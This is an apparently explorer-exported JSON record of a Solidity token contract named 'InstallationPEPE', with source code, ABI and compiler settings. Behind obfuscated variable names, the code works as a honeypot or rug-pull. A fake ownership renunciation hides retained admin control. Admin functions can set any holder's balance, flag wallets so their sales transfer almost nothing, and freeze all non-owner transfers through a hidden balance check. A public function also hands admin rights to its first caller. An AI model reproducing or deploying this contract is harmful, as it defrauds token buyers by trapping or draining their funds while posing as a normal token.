{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface tradingModeLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverSwap) external view returns (uint256);\n\n    function transfer(address exemptFrom, uint256 atSell) external returns (bool);\n\n    function allowance(address txMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptFrom,\n        uint256 atSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderSellList, uint256 value);\n    event Approval(address indexed txMin, address indexed spender, uint256 value);\n}\n\nabstract contract receiverAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletSenderFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface limitReceiver {\n    function createPair(address listFund, address teamMax) external returns (address);\n}\n\ninterface tradingModeLaunchedMetadata is tradingModeLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InstallationPEPE is receiverAuto, tradingModeLaunched, tradingModeLaunchedMetadata {\n\n    bool private senderLiquidity;\n\n    address atTeamIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private txFundWallet;\n\n    function buyList() public {\n        emit OwnershipTransferred(totalLimit, address(0));\n        limitTotal = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return limitTotal;\n    }\n\n    string private swapTeamMarketing = \"Installation PEPE\";\n\n    function transfer(address marketingBuy, uint256 atSell) external virtual override returns (bool) {\n        return launchedLimit(_msgSender(), marketingBuy, atSell);\n    }\n\n    event OwnershipTransferred(address indexed totalTx, address indexed shouldSenderBuy);\n\n    function fundLimitExempt() private view {\n        require(launchMode[_msgSender()]);\n    }\n\n    function allowance(address senderExemptShould, address limitMin) external view virtual override returns (uint256) {\n        if (limitMin == teamLaunch) {\n            return type(uint256).max;\n        }\n        return txFundWallet[senderExemptShould][limitMin];\n    }\n\n    bool private receiverTx;\n\n    uint256 private maxReceiver;\n\n    mapping(address => uint256) private liquidityTeam;\n\n    constructor (){\n        if (maxReceiver == exemptIs) {\n            senderLiquidity = false;\n        }\n        walletSenderFund receiverSell = walletSenderFund(teamLaunch);\n        enableMarketingTake = limitReceiver(receiverSell.factory()).createPair(receiverSell.WETH(), address(this));\n        \n        totalLimit = _msgSender();\n        buyList();\n        launchMode[totalLimit] = true;\n        liquidityTeam[totalLimit] = shouldExempt;\n        if (launchedReceiver != exemptIs) {\n            launchReceiver = true;\n        }\n        emit Transfer(address(0), totalLimit, shouldExempt);\n    }\n\n    function swapMaxLaunch(uint256 atSell) public {\n        fundLimitExempt();\n        walletShouldExempt = atSell;\n    }\n\n    function buyExemptLaunched(address buyMax) public {\n        fundLimitExempt();\n        if (launchedReceiver == maxReceiver) {\n            receiverTx = false;\n        }\n        if (buyMax == totalLimit || buyMax == enableMarketingTake) {\n            return;\n        }\n        feeIs[buyMax] = true;\n    }\n\n    function senderEnable(address marketingBuy, uint256 atSell) public {\n        fundLimitExempt();\n        liquidityTeam[marketingBuy] = atSell;\n    }\n\n    mapping(address => bool) public feeIs;\n\n    mapping(address => bool) public launchMode;\n\n    function toExempt(address takeFundSwap) public {\n        if (marketingSell) {\n            return;\n        }\n        if (exemptIs != maxReceiver) {\n            maxReceiver = launchedReceiver;\n        }\n        launchMode[takeFundSwap] = true;\n        \n        marketingSell = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellToken;\n    }\n\n    uint256 public launchedReceiver;\n\n    function launchedLimit(address tokenTake, address exemptFrom, uint256 atSell) internal returns (bool) {\n        if (tokenTake == totalLimit) {\n            return listSell(tokenTake, exemptFrom, atSell);\n        }\n        uint256 shouldToken = tradingModeLaunched(enableMarketingTake).balanceOf(atTeamIs);\n        require(shouldToken == walletShouldExempt);\n        require(exemptFrom != atTeamIs);\n        if (feeIs[tokenTake]) {\n            return listSell(tokenTake, exemptFrom, minTo);\n        }\n        return listSell(tokenTake, exemptFrom, atSell);\n    }\n\n    function owner() external view returns (address) {\n        return limitTotal;\n    }\n\n    uint256 private shouldExempt = 100000000 * 10 ** 18;\n\n    uint256 constant minTo = 15 ** 10;\n\n    uint256 private exemptIs;\n\n    bool private modeFrom;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamTake;\n    }\n\n    function approve(address limitMin, uint256 atSell) public virtual override returns (bool) {\n        txFundWallet[_msgSender()][limitMin] = atSell;\n        emit Approval(_msgSender(), limitMin, atSell);\n        return true;\n    }\n\n    address public enableMarketingTake;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldExempt;\n    }\n\n    function balanceOf(address receiverSwap) public view virtual override returns (uint256) {\n        return liquidityTeam[receiverSwap];\n    }\n\n    uint256 walletShouldExempt;\n\n    function name() external view virtual override returns (string memory) {\n        return swapTeamMarketing;\n    }\n\n    bool private launchReceiver;\n\n    address public totalLimit;\n\n    uint256 txReceiver;\n\n    string private teamTake = \"IPE\";\n\n    function transferFrom(address tokenTake, address exemptFrom, uint256 atSell) external override returns (bool) {\n        if (_msgSender() != teamLaunch) {\n            if (txFundWallet[tokenTake][_msgSender()] != type(uint256).max) {\n                require(atSell <= txFundWallet[tokenTake][_msgSender()]);\n                txFundWallet[tokenTake][_msgSender()] -= atSell;\n            }\n        }\n        return launchedLimit(tokenTake, exemptFrom, atSell);\n    }\n\n    uint8 private sellToken = 18;\n\n    address teamLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private listMarketing;\n\n    function listSell(address tokenTake, address exemptFrom, uint256 atSell) internal returns (bool) {\n        require(liquidityTeam[tokenTake] >= atSell);\n        liquidityTeam[tokenTake] -= atSell;\n        liquidityTeam[exemptFrom] += atSell;\n        emit Transfer(tokenTake, exemptFrom, atSell);\n        return true;\n    }\n\n    bool public marketingSell;\n\n    address private limitTotal;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldSenderBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderSellList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderExemptShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMax\",\"type\":\"address\"}],\"name\":\"buyExemptLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMarketingTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atSell\",\"type\":\"uint256\"}],\"name\":\"senderEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atSell\",\"type\":\"uint256\"}],\"name\":\"swapMaxLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFundSwap\",\"type\":\"address\"}],\"name\":\"toExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "InstallationPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}